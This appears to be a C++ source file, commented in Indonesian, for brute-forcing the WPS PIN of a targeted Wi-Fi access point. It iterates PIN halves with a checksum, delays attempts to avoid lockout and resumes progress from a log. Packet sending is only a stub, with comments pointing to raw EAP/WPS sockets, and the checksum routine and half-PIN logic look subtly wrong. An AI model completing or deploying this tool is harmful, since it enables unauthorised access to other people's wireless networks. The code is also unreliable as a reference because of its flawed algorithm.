#include <iostream>
#include <pcap.h>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <thread>
#include <fstream>

using namespace std;

// Konfigurasi
const char* IFACE = "wlan0";         // Interface Wi-Fi (mode monitor)
const char* BSSID = "00:11:22:33:44:55";  // MAC AP target
const int DELAY = 1;                 // Delay dalam detik
const string LOG_FILE = "wps_crack.log";

// Fungsi untuk menghitung checksum WPS PIN
int calculate_checksum(string pin) {
    int accum = 0;
    for (char c : pin) {
        int digit = c - '0';
        accum += (accum % 2 == 0) ? 3 * digit : digit;
    }
    return (10 - accum % 10) % 10;
}

// Fungsi untuk mengirim paket WPS (simulasi sederhana)
bool send_wps_packet(const string& pin, const char* iface, const char* bssid) {
    // Dalam dunia nyata, gunakan raw socket untuk kirim paket EAP/WPS
    cout << "Mencoba PIN: " << pin << endl;
    sleep(DELAY); // Hindari lockout
    // Simulasi respons (ganti dengan pcap sniffing)
    return pin == "12345670"; // Dummy PIN untuk testing
}

// Membaca progres terakhir dari log
pair<int, int> load_progress() {
    ifstream log(LOG_FILE);
    string line, last_pin;
    while (getline(log, line)) {
        if (line.find("Mencoba PIN") != string::npos) {
            last_pin = line.substr(line.find(": ") + 2);
        }
    }
    log.close();
    if (!last_pin.empty()) {
        return {stoi(last_pin.substr(0, 4)), stoi(last_pin.substr(4, 3))};
    }
    return {0, 0};
}

// Fungsi utama cracking
string crack_wps() {
    ofstream log(LOG_FILE, ios::app);
    auto [start_pin1, start_pin2] = load_progress();
    log << "Memulai cracking WPS..." << endl;

    // Bagian pertama (4 digit)
    for (int pin1 = start_pin1; pin1 < 10000; ++pin1) {
        string pin_base = string(4 - to_string(pin1).length(), '0') + to_string(pin1) + "000";
        int checksum = calculate_checksum(pin_base);
        string pin = pin_base + to_string(checksum);
        log << "Mencoba PIN: " << pin << endl;

        if (send_wps_packet(pin, IFACE, BSSID)) {
            cout << "Bagian pertama ditemukan: " << pin1 << endl;
            // Bagian kedua (3 digit)
            for (int pin2 = start_pin2; pin2 < 1000; ++pin2) {
                string pin_full = string(4 - to_string(pin1).length(), '0') + to_string(pin1) +
                                 string(3 - to_string(pin2).length(), '0') + to_string(pin2);
                checksum = calculate_checksum(pin_full);
                pin = pin_full + to_string(checksum);
                log << "Mencoba PIN: " << pin << endl;

                if (send_wps_packet(pin, IFACE, BSSID)) {
                    log << "PIN WPS ditemukan: " << pin << endl;
                    log.close();
                    return pin;
                }
            }
            start_pin2 = 0; // Reset untuk bagian kedua
        }
    }
    log << "PIN tidak ditemukan." << endl;
    log.close();
    return "";
}

int main() {
    // Pastikan interface dalam mode monitor
    cout << "Cracking WPS pada " << BSSID << " menggunakan " << IFACE << endl;
    string pin = crack_wps();
    if (!pin.empty()) {
        cout << "Sukses! PIN WPS: " << pin << endl;
    } else {
        cout << "Gagal menemukan PIN." << endl;
    }
    return 0;
}
